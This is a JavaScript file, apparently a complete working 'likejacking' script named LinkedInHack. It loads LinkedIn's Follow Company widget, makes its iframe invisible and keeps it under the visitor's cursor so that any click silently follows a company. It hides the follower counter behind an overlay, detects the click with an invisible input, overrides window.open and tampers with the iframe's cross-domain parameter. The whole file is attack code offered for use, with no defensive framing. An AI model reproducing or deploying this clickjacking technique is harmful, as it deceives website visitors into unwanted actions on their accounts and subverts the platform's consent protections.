"use strict";
function LinkedInHack(){
	if (document.cookie==='LINKEDINFOLLOWED'){
		console.log('LINKEDINALREADYFOLLOWED');
		return;
	}
	function injectScripts(){
		var domScript1=document.createElement('script');
		domScript1.src="//platform.linkedin.com/in.js";
		domScript1.innerHTML=' lang: en_US';
		document.body.appendChild(domScript1);

		var domScript2=document.createElement('script');
		domScript2.setAttribute('type', 'IN/FollowCompany');
		domScript2.setAttribute('data-id', '11052999'); //get number on https://developer.linkedin.com/plugins/follow-company
		domScript2.setAttribute('data-counter', 'top');
		document.body.appendChild(domScript2);
	}

	function getDomContainer(){
		var domContainers=document.getElementsByTagName('iframe');
		if (!domContainers || !domContainers.length){
			return false;
		} else  {
			for (var i=0, domIframe; i<domContainers.length; ++i){
				domIframe=domContainers[i];
				if (domIframe.name && domIframe.name.indexOf('easyXDM')!==-1){
					return domIframe;
				}
			}
			return false;
		}
	}

	function putUnderMouse(event){
		var isTouch=(event.touches && event.touches.length)?true:false;
	    var xPx = (isTouch)?event.touches[0].clientX:event.clientX;
	    var yPx = (isTouch)?event.touches[0].clientY:event.clientY;

	    var topPx=Math.round(yPx-_domContainerBB.height/2);
	    var leftPx=Math.round(xPx-_domContainerBB.width/2);
	    _domContainer.style.top=(topPx-16).toString()+'px';
		_domContainer.style.left=leftPx.toString()+'px';

		_domCounterHide.style.top=(topPx-16).toString()+'px';
		_domCounterHide.style.left=leftPx.toString()+'px';
	}

	function addEventListener(domElt, evType, cb){
		domElt.addEventListener(evType, cb, false);
		_eventListeners.push([domElt, evType, cb]);
	}

	injectScripts();


	var _domContainer, _domContainerBB, _eventListeners=[], _focusCatcher, _domCounterHide;


	function start(){
		_domContainer=getDomContainer();
		if (!_domContainer){
			setTimeout(start, 200);
			return;
		}

		window.prout=_domContainer; //return;

		

		//_domContainer.style.display='none';
		var timerCheckStyle=setInterval(function(){
			_domContainerBB=_domContainer.getBoundingClientRect();
				
			if (_domContainer.style.display!=='none' && _domContainerBB.width>1 &&  _domContainerBB.height>1){
				_domCounterHide=document.createElement('div');
				_domCounterHide.style.width=_domContainerBB.width.toString()+'px';
				_domCounterHide.style.height=(_domContainerBB.height-20).toString()+'px';
				//_domCounterHide.style.backgroundColor='red';
				_domCounterHide.style.zIndex=999;
				_domCounterHide.style.opacity='0';
				_domCounterHide.style.position='fixed';
				document.body.appendChild(_domCounterHide);


				_domContainer.style.position='fixed';
				_domContainer.style.cursor='auto !important';
				

				addEventListener(window, 'mousemove', putUnderMouse);
				addEventListener(window, 'touchmove', putUnderMouse);
				addEventListener(document, "visibilitychange", terminate);

				_focusCatcher=document.createElement('input');
				_focusCatcher.setAttribute('type', 'text');
				_focusCatcher.setAttribute('style', 'position: fixed; opacity: 0; pointer-events: none');
				document.body.appendChild(_focusCatcher);
				_focusCatcher.focus();
				addEventListener(_focusCatcher, 'focusout', function(event){
					//_domContainer.style.opacity='1';
					terminate();
				});

				_domContainer.style.opacity='0';

				window.open=function(){alert('prout');};

				var target=_domContainer.src.split('target=').pop().split('&').shift();
				_domContainer.src=_domContainer.src.replace(/xdm_e=[^&]+/, 'xdm_e=http%3A%2F%2Fgoogle'+Date.now()+'.com');
				
				//console.log('src=', _domContainer.src);
				
				clearInterval(timerCheckStyle);
			}
		}, 100);
	}
	setTimeout(start, 100);

	function terminate(event){
		document.body.removeChild(_domCounterHide);
		document.body.removeChild(_focusCatcher);
		_eventListeners.forEach(function(el){
			el[0].removeEventListener(el[1], el[2], false);
		});
		console.log('terminate');
		document.cookie='LINKEDINFOLLOWED';
		setTimeout(function(){
			_domContainer.parentElement.removeChild(_domContainer);
		}, 200);
	}
}
